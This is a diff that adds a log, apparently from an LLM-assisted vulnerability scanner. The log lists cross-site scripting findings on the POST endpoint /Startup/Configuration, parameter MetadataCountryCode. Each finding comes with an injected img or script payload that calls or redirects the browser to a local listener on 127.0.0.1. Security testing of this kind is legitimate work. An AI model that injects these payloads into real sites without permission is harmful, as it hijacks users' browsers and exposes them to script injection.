@@ -1,0 +1,39 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Startup/Configuration
+Vul API Method: Post
+API Vul Param: MetadataCountryCode
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Startup/ConfigurationLLMMetadataCountryCode'>
+
+API Vul Type: xss
+Vul API Url: /Startup/Configuration
+Vul API Method: Post
+API Vul Param: MetadataCountryCode
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Startup/ConfigurationLLMMetadataCountryCode'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Startup/Configuration
+Vul API Method: Post
+API Vul Param: MetadataCountryCode
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Startup/ConfigurationLLMMetadataCountryCode'>
+
+API Vul Type: xss
+Vul API Url: /Startup/Configuration
+Vul API Method: Post
+API Vul Param: MetadataCountryCode
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Startup/ConfigurationLLMMetadataCountryCode'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Startup/Configuration
+Vul API Method: Post
+API Vul Param: MetadataCountryCode
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Startup/ConfigurationLLMMetadataCountryCode'</script>
+
+API Vul Type: xss
+Vul API Url: /Startup/Configuration
+Vul API Method: Post
+API Vul Param: MetadataCountryCode
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Startup/ConfigurationLLMMetadataCountryCode'</script>
+
